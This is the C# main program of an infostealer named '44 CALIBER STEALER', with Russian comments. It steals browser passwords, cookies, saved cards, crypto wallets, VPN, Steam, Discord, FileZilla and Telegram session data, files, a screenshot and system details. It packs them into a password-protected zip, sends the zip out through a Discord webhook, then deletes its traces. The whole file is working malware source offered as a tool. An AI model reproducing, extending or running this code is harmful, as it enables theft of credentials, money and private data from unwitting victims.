using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

// made by lolzguru/Thanatophobia | tg/@chaosinsurgency 

namespace pidoras
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (!File.Exists(Help.ExploitDir)) // Проверка запущен ли уже стиллер
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли уже стиллер
                {
                    try
                    {
                        Directory.CreateDirectory(Help.ExploitDir);
                        List<Thread> Threads = new List<Thread>();

                        Threads.Add(new Thread(() => Browsers.Start())); // Старт потока с браузерами

                        Threads.Add(new Thread(() => Files.GetFiles())); // Старт потока с грабом файлов

                        Threads.Add(new Thread(() => StartWallets.Start())); // Старт потока c криптокошельками

                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); // Получение информации о айпи
                            Screen.GetScreen(); // Скриншот экрана
                            ProcessList.WriteProcesses(); // Получение списка процессов
                            SystemInfo.GetSystem(); // Скриншот экрана
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            ProtonVPN.Save();
                            OpenVPN.Save();
                            NordVPN.Save();
                            Steam.SteamGet();
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            Discord.WriteDiscord();
                            FileZilla.GetFileZilla();
                            Telegram.GetTelegramSessions();
                            Vime.Get();
                        }));

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();

                        // Пакуем в апхив с паролем
                        string zipArchive = Help.ExploitDir + "\\" + SystemInfo.CountryCode() + SystemInfo.IP() + "(" + Help.dateLog + ")" + ".zip";
                        using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
                        {
                            zip.ParallelDeflateThreshold = -1;
                            zip.UseZip64WhenSaving = Ionic.Zip.Zip64Option.Always;
                            zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default; // Задаем степень сжатия 
                            zip.Comment = 
                           "\n ================================================" +
                           "\n ===============44 CALIBER STEALER===============" +
                           "\n ================================================" +
                           "\n " + Environment.MachineName + " / " + Environment.UserName +
                           "\n IP: " + SystemInfo.IP() + SystemInfo.Country() +
                           "\n " + SystemInfo.GetSystemVersion() +
                          //"\n MODULES:" +
                          //(Config.StartUp == true ? "\n   StartUp ENABLED" : "") +
                          //(Config.StartUp == false ? "\n   StartUp DISABLED" : "") +
                          //(Config.AntiVM == true ? "\n   AntiVM ENABLED" : "") +
                          //(Config.AntiVM == false ? "\n   AntiVM DISABLED" : "") +
                          //(Config.AntiDebugger == true ? "\n   AntiDebugger ENABLED" : "") +
                          //(Config.AntiDebugger == false ? "\n   AntiDebugger DISABLED" : "") +
                          //(Config.MinecraftModule == true ? "\n VimeWorld Module ENABLED" : "") +
                          //(Config.MinecraftModule == false ? "\n VimeWorld Module DISABLED" : "") +
                          "\n STATISTIC:" +
                           "\n   Passwords - " + Counting.Passwords +
                           "\n   Cookies - " + Counting.Cookies +
                           //"\n History - " + Counting.History +
                           "\n   AutoFills - " + Counting.AutoFill +
                           "\n   Cards - " + Counting.CreditCards +
                           "\n   Grabbed Files - " + Counting.FileGrabber +
                           "\n GRABBED SOFTWARE:" +
                           (Counting.Discord > 0 ? "\n   Discord" : "") +
                           (Counting.Wallets > 0 ? "\n   Wallets" : "") +
                           (Counting.Telegram > 0 ? "\n   Telegram" : "") +
                           (Counting.FileZilla > 0 ? "\n   FileZilla" + " (" + Counting.FileZilla + ")" : "") +
                           (Counting.Steam > 0 ? "\n   Steam" : "") +
                           (Counting.NordVPN > 0 ? "\n   NordVPN" : "") +
                           (Counting.OpenVPN > 0 ? "\n   OpenVPN" : "") +
                           (Counting.ProtonVPN > 0 ? "\n   ProtonVPN" : "") +
                           (Counting.VimeWorld > 0 ? "\n   VimeWorld" + (Config.VimeWorld == true ?
                           $":\n     NickName - {Vime.NickName()} " +
                           $":\n     Donate - {Vime.Donate()} " +
                           $":\n     Level - {Vime.Level()}" : "") : "") +
                           "\n DOMAINS DETECTED:" +
                           "\n - " + URLSearcher.GetDomainDetect(Help.ExploitDir + "\\Browsers\\");
                            zip.Password = Config.zipPass;
                            zip.AddDirectory(Help.ExploitDir); // Кладем в архив содержимое папки с логом
                            zip.Save(zipArchive); // Сохраняем архив    
                        }

                        string mssgBody =
                        "\n :spy: NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName + " :person_in_manual_wheelchair:" +
                        "\n :eye: IP: " + SystemInfo.IP() + SystemInfo.Country() +
                        "\n :desktop: " + SystemInfo.GetSystemVersion();
                        string filename = Environment.MachineName + "." + Environment.UserName + ".zip"; ;
                        string fileformat = "zip";
                        string filepath = zipArchive;
                        string application = "";

                        try
                        {
                            DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Старт потока дискорда
                        }
                        catch
                        {
                            DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
                        }

                        Finish(); // Автоудалением

                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }

        static void Finish()
        {
            Thread.Sleep(15000);
            Directory.Delete(Help.ExploitDir + "\\", true);
            Environment.Exit(0);
        }

    }
}
